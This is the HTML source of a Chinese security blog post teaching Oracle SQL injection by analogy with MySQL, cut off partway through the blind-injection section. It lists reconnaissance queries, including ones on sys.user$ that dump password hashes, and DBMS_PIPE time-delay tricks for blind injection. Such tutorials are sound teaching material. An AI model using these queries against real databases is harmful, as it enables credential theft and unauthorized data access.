@@ -1,0 +1,1241 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="当我们学会了 MySQL 注入后如何学会 Oracle 注入？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle 注入指北">
+<meta property="og:url" content="https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="当我们学会了 MySQL 注入后如何学会 Oracle 注入？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
+<meta property="article:published_time" content="2019-04-16T15:50:53.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
+  
+  
+  
+  <title>Oracle 注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Oracle 注入指北"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-04-16 15:50" pubdate>
+          2019年4月16日 15:50:53
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          80 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Oracle 注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>当我们学会了 MySQL 注入后如何学会 Oracle 注入？</p>
+<span id="more"></span>
+<p>类比学习法通常效率很高。接下来我将通过类比 MySQL 与 Oracle 的方法来讲述 Oracle 注入，以求快速迁移知识。</p>
+<h2 id="安装-oracle">安装 Oracle</h2>
+<p><a href="https://www.tr0y.wang/2019/04/16/%E7%94%A8Docker%E5%AE%89%E8%A3%85Oracle/">传送门🚪</a></p>
+<h2 id="oracle-极速入门">Oracle 极速入门</h2>
+<p>我们可以把 Database（数据库） 看作是一个大仓库，仓库分了很多很多的房间，Schema 就是其中的房间，一个 Schema 代表一个房间，Table 可以看作是每个Schema 中的床，Table（表）被放入每个房间中，不能放置在房间之外，放在外面岂不是就是无家可归了。然后床上可以放置很多物品，就好比 Table 上可以放置很多列和行一样。数据库中存储数据的基本单元是 Table，对应现实中每个仓库放置物品的基本单位就是床， User（用户） 就是每个 Schema 的主人（所以 Schema 包含的是 Object，而不是 User），User 和 Schema 是一一对应的，每个 User 在没有特别指定下只能使用自己 Schema（房间）的东西，如果一个 User 想使用其他 Schema（房间）的东西，那就要看那个 Schema（房间）的 User（主人）有没有给你这个权限了，或者看这个仓库的老大（DBA）有没有给你这个权限了。换句话说，如果你是某个仓库的主人，那么这个仓库的使用权和仓库中的所有东西都是你的（包括房间），你有完全的操作权，可以扔掉不用的东西从每个房间，也可以放置一些有用的东西到某一个房间，你还可以给每个 User 分配具体的权限，也就是规定某 User（某人）到 某一个 Schema（某一个房间）能做些什么，是只能看（Read-Only），还是可以像房间主人一样有所有的控制权（R/W）。这个就要看这个 User 所对应的 Role（角色）了。假如你是仓库的老大（DBA），你还可以设计一张工卡（角色），分为普通用户与 vip，拥有 vip 工卡的人，可以拥有你的权限。工卡（角色）并不指代具体的用户，只是权限的集合。</p>
+<h3 id="基本概念">基本概念</h3>
+<p>Oracle 中有三个重要的基本概念：<code>数据库实例</code>、<code>数据库</code>、<code>SID</code>。</p>
+<p>Oracle 的数据库实例（Instance）其实是<code>后台进程</code>和 <code>SGA</code> 的总称：</p>
+<ul>
+<li><code>后台进程</code>：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求。</li>
+<li><code>SGA</code>：全称为 <code>System Global Area</code>，即<code>系统全局区域</code>。实际上是内存中的一片共享区域，其中包含实例配置、数据缓存、操作日志等信息，由后台进程进行共享。</li>
+</ul>
+<p>而通常数据库实例会用一个唯一标识来标识，这个标识符便称为 <code>SID</code>（System Identifier）。</p>
+<p><code>数据库</code>一般指物理存储的文件，Oracle 数据库除了基本的数据文件，还有<code>控制文件</code>和 <code>Redo 日志</code>。数据库一般位于 <code>$ORACLE_HOME/oradata/SID</code>，SID 对应创建数据库时指定的实例 SID，数据文件以 <code>*.dbf</code> 的形式存放。</p>
+<p>首先，<code>数据库实例</code>和<code>数据库</code>并不是必须相互依赖而存在的。当实例启动时，可以不关联任何数据库。数据库可以存在于磁盘，不附加到任何实例，当然这样无法与用户进行交互。一般而言，数据库附加到实例中，与其进行关联，是一对一的关系。但是在集群环境下，一个数据库可以对应多个实例，这些实例分布在不同的服务器上。但反过来，一个实例只能对应一个数据库。</p>
+<h3 id="数据结构">数据结构</h3>
+<blockquote>
+<p>表空间</p>
+</blockquote>
+<p>相对于其他数据库，Oracle 中有一个比较特殊的概念：<code>表空间</code>（Tablespace）。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Oracle注入指北/20190421103021462.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /><br />
+如上图，当数据库创建时，Oracle 会默认创建五个表空间：<code>SYSTEM</code>、<code>SYSAUX</code>、<code>USERS</code>、<code>UNDOTBS</code>、<code>TEMP</code>：</p>
+<ul>
+<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
+<li>SYSAUX：类似于 <code>SYSTEM</code>，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
+<li>UNDOTBS：用于事务回退等</li>
+<li>TEMP：作为缓存空间减少内存负担</li>
+<li>USERS：就是存储我们定义的表和数据</li>
+</ul>
+<blockquote>
+<p>Schema</p>
+</blockquote>
+<p>Oracle 数据库支持多用户，用户想在同个数据库中创建相同名称的表或其他歧义数据，该怎么办？</p>
+<p>Oracle 中使用 <code>Schema</code> 的概念将每个用户的数据进行分离，Schema 其实类似于<code>命名空间</code>（Namespace），默认情况下，Schema 的名称同用户名称相同。</p>
+<p><code>Schema</code>和<code>表空间</code>是一个层次的概念，它们都有一个很重要的特性，就是对表的独占性。Schema 是表的逻辑集合，是所有应用访问表必须指定的对象（一般都省略了，但是实际上一定是 <code>db.schema.table</code> 这种访问模式，例如访问 <code>scott</code> 用户下的 emp 表，这时 Schema 的名称也为 <code>scott</code>，而 <code>select from emp</code> 这条 sql 语句的完整写法为：<code>select from scott.emp</code>），同一张表不可能既属于这个 Schema，又属于另一个 Schema。表空间是表的物理集合，是所有磁盘读写必须访问的文件（一般由 Oracle 管理，个性化的需求DBA 管理），同一张表也不可能既放在这个表空间，又放在那个表空间。</p>
+<h3 id="权限与用户管理">权限与用户管理</h3>
+<blockquote>
+<p>权限和角色</p>
+</blockquote>
+<p>Oracle 中划分了许多用户权限，权限的集合称为<code>角色</code>。例如 <code>CONNECT</code> 角色具有连接到数据库权限，<code>RESOURCE</code> 能进行基本的 <code>CURD</code> 操作（即，增加：create，修改：update，查找：read，删除：delete），<code>DBA</code> 则集合了所有的用户权限。</p>
+<blockquote>
+<p>用户</p>
+</blockquote>
+<p>创建数据库时，会默认启用 <code>sys</code>、<code>system</code> 等用户：</p>
+<ul>
+<li>sys：相当于 Linux 下的 root 用户。为 <code>DBA</code> 角色</li>
+<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 <code>DBA</code> 角色。</li>
+<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
+</ul>
+<p>一篇比较详细的 Oracle 权限管理的博文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yw0219/p/5855210.html">传送门🚪</a></p>
+<h3 id="基本语法">基本语法</h3>
+<p>按照 MySQL 注入的学习方法，先从语法入手：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">column</span>, group_function(<span class="hljs-keyword">column</span>)<br><span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span><br>[<span class="hljs-keyword">where</span> condition]<br>[<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> group_by_expression]<br>[<span class="hljs-keyword">having</span> group_condition]<br>[<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">column</span>];<br></code></pre></td></tr></table></figure><br />
+执行过程：from -- where -- group by -- having -- select -- order by</p>
+<p>可以看出，和 MySQL 很类似。实际上都是 SQL 标准的语法。</p>
+<h2 id="与-mysql-的区别">与 MySQL 的区别</h2>
+<p>注意：</p>
+<ul>
+<li><strong>以下加了 <code>-- priv</code> 的语句说明需要管理员权限</strong></li>
+<li><strong>虽然 Oracle 没有类似 MySQL 的<code>数据库</code>的概念，而是用<code>表空间</code>来代替：一个 Oracle 只有一个数据库，它给账户开辟数据库空间，称之为<code>表空间(TableSpace)</code>，创建数据库就是开辟账户的表空间。为了叙述的方便，我将 Oracle 的<code>表空间</code>也称为 <code>数据库</code></strong></li>
+</ul>
+<h3 id="语法">语法</h3>
+<ul>
+<li>select 必须要指明表名。若并非对真实的表进行查询，则需要用 <code>dual</code> 作为表名。</li>
+<li>单引号与双引号：Oracle 的单引号与 MySQL 一直，但是双引号用于消除系统关键字。例如，有个表的字段叫<code>sysdate</code>，因为<code>sysdate</code>属于<code>oracle</code>中的关键字，但你要查询这个字段的时候，就需要<code>select "sysdate" from dual;</code>，若用 <code>select 'sysdate' from table_name;</code>查询就相当于 <code>　　select sysdate from table_name;</code>，而<code>sysdate</code> 用于获得当前时间。</li>
+<li>第 n 行的数据：<code>SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;</code>：<code>select colmn_name from table_name limit n, 1;</code></li>
+<li>拼接字符：<code>SELECT 'a' || 'b' FROM dual;</code>：<code>select 'a' 'b'</code></li>
+<li><code>case 语法</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code></li>
+<li>Oracle 中空字符串<code>''</code>就是<code>null</code>（也就是说，只有<code>null</code>，没有空字符），而 MySQL 是区分<code>null</code>和<code>''</code>的。</li>
+</ul>
+<h3 id="系统表">系统表</h3>
+<ul>
+<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
+<li>all_tables : 当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</li>
+<li>user_tables: 当前用户名下的表的信息</li>
+<li>DBA_ALL_TABLES：<code>DBA</code> 用户所拥有的或有访问权限的对象和表</li>
+<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
+<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
+</ul>
+<p>总结：</p>
+<ul>
+<li><code>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</code></li>
+<li><code>DBA_ALL_TABLES &gt;= ALL_ALL_TABLES &gt;= USER_ALL_TABLES</code></li>
+</ul>
+<p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全</p>
+<p>同样，<code>user_tab_columns</code>、<code>all_tab_columns</code>、<code>dba_tab_columns</code> 也是一样的。</p>
+<h3 id="获取数据库信息">获取数据库信息</h3>
+<p>描述：<code>Oracle</code>: <code>MySQL</code></p>
+<ul>
+<li>服务器版本：<code>SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';</code> 或者 <code>SELECT version FROM v$instance;</code>：<code>select version()</code></li>
+<li>操作系统版本：<code>SELECT banner FROM v$version where banner like 'TNS%';</code>: <code>@@version_compile_os</code></li>
+<li>当前数据库：<code>SELECT global_name FROM global_name;</code> 或者 <code>SELECT name FROM v$database;</code>或者<code>SELECT instance_name FROM v$instance;</code>或者<code>SELECT SYS.DATABASE_NAME FROM DUAL;</code>：<code>select database()</code></li>
+<li>获取当前用户权限的所有数据库：<code>SELECT DISTINCT owner, table_name FROM all_tables;</code></li>
+<li>表名：<code>SELECT table_name FROM all_tables;</code>：<code>select table_name from information_schema.tables</code></li>
+<li>字段名：<code>SELECT column_name FROM all_tab_columns</code>：<code>select COLUMN_NAME from information_schema.COLUMNS</code></li>
+</ul>
+<h3 id="获取用户信息">获取用户信息</h3>
+<p>描述：<code>Oracle</code>: <code>MySQL</code></p>
+<ul>
+<li>当前数据库用户：<code>SELECT user FROM dual;</code>: <code>user()</code></li>
+<li>所有数据库用户：<code>SELECT username FROM all_users ORDER BY username;</code> 或者 <code>SELECT name FROM sys.user$; -- priv</code>：<code>select user from mysql.user;</code></li>
+<li>所有数据库用户的密码 hash：<code>SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g</code> 或者 <code>SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g</code></li>
+<li>当前用户的权限：<code>SELECT * FROM session_privs;</code>：<code>show grants;</code></li>
+<li>所有用户的权限：<code>SELECT * FROM dba_sys_privs -- priv</code>：<code>select Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv from mysql.user; -- priv, mysql.user 中各种以 _priv 结尾的字段</code></li>
+<li>用户角色：<code>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</code> 或者 <code>SELECT DISTINCT grantee FROM dba_sys_privs</code>：<code>select user, Super_priv from mysql.user;</code></li>
+</ul>
+<h3 id="函数">函数</h3>
+<h4 id="两者相同">两者相同</h4>
+<p>数学函数</p>
+<ul>
+<li>ROUND</li>
+<li>ABS</li>
+<li>CEIL</li>
+<li>FLOOR</li>
+<li>MAX</li>
+<li>MIN</li>
+</ul>
+<p>字符串函数</p>
+<ul>
+<li>ASCII</li>
+<li>CHAR</li>
+<li>REPLACE</li>
+<li>SUBSTRING</li>
+<li>INSTR</li>
+<li>LOCATE</li>
+<li>LPAD</li>
+<li>UPPER</li>
+<li>LOWER</li>
+</ul>
+<h4 id="两者不同">两者不同</h4>
+<p>描述：<code>Oracle</code>: <code>MySQL</code></p>
+<ul>
+<li><p>按位与：<code>SELECT bitand(6, 2) FROM dual;</code>：<code>select 6 &amp; 2</code></p></li>
+<li><p>字符串转 hex：<code>select utl_raw.cast_to_raw('admin') from dual;</code>：<code>hex()</code></p></li>
+<li><p>查找子串：<code>select INSTR('sdsq', 's', 2) value from dual -- 要求从位置 2 开始</code>：<code>select INSTR('sdsq', 's') value -- 从默认的位置 1 开始，无法改变</code></p></li>
+<li><p>SUBSTR：MySQL 有，Oracle 无，但是 Oracle 可用 <code>substring</code> 代替</p></li>
+<li><p>求字符长度：<code>LENGTH</code>：<code>CHAR_LENGTH</code></p></li>
+<li><p>求字节长度：<code>LENGTHB</code>：<code>LENGTH</code></p></li>
+<li><p>"case"：<code>select decode('s', 's', 'n', 'none') from dual; -- decode(条件, 值 1, 翻译值 1, 值 2, 翻译值2 , ...值 n, 翻译值 n, 缺省值)</code>：<code>用 case 实现</code></p></li>
+<li><p>时延：<code>select DBMS_PIPE.RECEIVE_MESSAGE('任意值', 1) from dual;</code>：<code>sleep(1)</code>。除此之外时延还可以利用 <code>select count(*) from all_objects;</code>来，原理是需要花费较多时间去查询所有数据库的条目。另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。</p></li>
+<li><p>SYS_CONTEXT<br />
+系统启动时，在 <code>userenv</code> 中存储了一些系统上下文信息，通过 <code>SYS_CONTEXT</code> 函数，我们可以取回相应的参数值。包括当前用户名等等。<br />
+更多可用参数说明可以查阅 Oracle 提供的文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm">SYS_CONTEXT</a></p></li>
+</ul>
+<p>更多非函数的语句区别可以见这个博文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yang5726685/article/details/78245742">传送门🚪</a></p>
+<h2 id="注入类型">注入类型</h2>
+<h3 id="常规注入">常规注入</h3>
+<p>注入后直接回显结果</p>
+<h3 id="盲注">盲注</h3>
+<p>类型</p>
+<ul>
+<li>布尔</li>
+<li>时间</li>
+<li>其他（报错、响应代码等等）</li>
+</ul>
+<p>利用方式</p>
+<ol type="1">
+<li>基于布尔：<br />
+利用字符串相关的函数，逐个字符猜解需要的信息即可</li>
+<li>基于时间<br />
+利用 <code>decode</code>、<code>case</code>等与时延函数搭配，逐个字符猜解需要的信息。<br />
+或者利用<code>REPLACE</code>+<code>substr</code>（这个利用技巧在 <a href="https://www.tr0y.wang/2019/03/25/MySQL%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E7%9B%B2%E6%B3%A8">MySQL 注入指北#盲注</a> 里说过了）：<br />
